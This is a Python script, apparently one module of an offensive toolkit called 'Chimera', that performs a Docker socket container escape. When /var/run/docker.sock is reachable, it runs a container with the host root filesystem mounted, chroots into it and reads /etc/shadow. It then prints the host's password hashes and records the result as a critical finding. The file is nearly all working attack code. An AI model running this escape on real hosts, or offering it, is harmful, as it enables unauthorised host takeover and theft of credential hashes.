import os
import sys
import subprocess

sys.path.append('/home/dan/Chimera_Project')
from core.db_handler import ChimeraDB

def run():
    db = ChimeraDB()
    os.system('clear')
    print("\033[34m" + "="*60)
    print("   CHIMERA AGENT 40 :: DOCKER SOCKET ESCAPE (INFILTRATOR)")
    print("="*60 + "\033[0m")

    socket_path = "/var/run/docker.sock"
    
    # 1. Check for the vulnerability
    if not os.path.exists(socket_path):
        print("\033[93m[!] No Docker socket found at /var/run/docker.sock. Escape not possible via this vector.\033[0m")
        return

    print("\033[92m[+] VULNERABILITY FOUND: Docker socket is accessible!\033[0m")

    # 2. The "Host Takeover" Command
    # This command pulls a tiny image (alpine), 
    # and mounts the ACTUAL host root (/) into the container's /mnt folder.
    # We then use 'chroot' to become the Host Root.
    escape_cmd = (
        "docker run -it --rm -v /:/mnt:ro alpine chroot /mnt /bin/sh -c 'cat /etc/shadow'"
    )

    print("[*] Attempting to read Host /etc/shadow via container escape...")

    try:
        # We run the command and see if we get the password hashes of the HOST machine
        result = subprocess.run(escape_cmd, shell=True, capture_output=True, text=True)
        
        if result.returncode == 0 and "root:" in result.stdout:
            print("\033[91m[!!!] SUCCESS: Host File System Accessed!\033[0m")
            print(f"[*] Preview of Host Shadow File:\n{result.stdout[:150]}...")
            
            db.report_finding("40_Docker_Socket_Infiltrator", "Docker_Escape_Success", {
                "vector": "socket_mount",
                "host_shadow_leak": "True",
                "severity": "CRITICAL"
            })
        else:
            print("[*] Socket found but 'docker' command is missing or restricted.")
            
    except Exception as e:
        print(f"[!] Escape attempt failed: {e}")

    db.close()

if __name__ == "__main__":
    run()
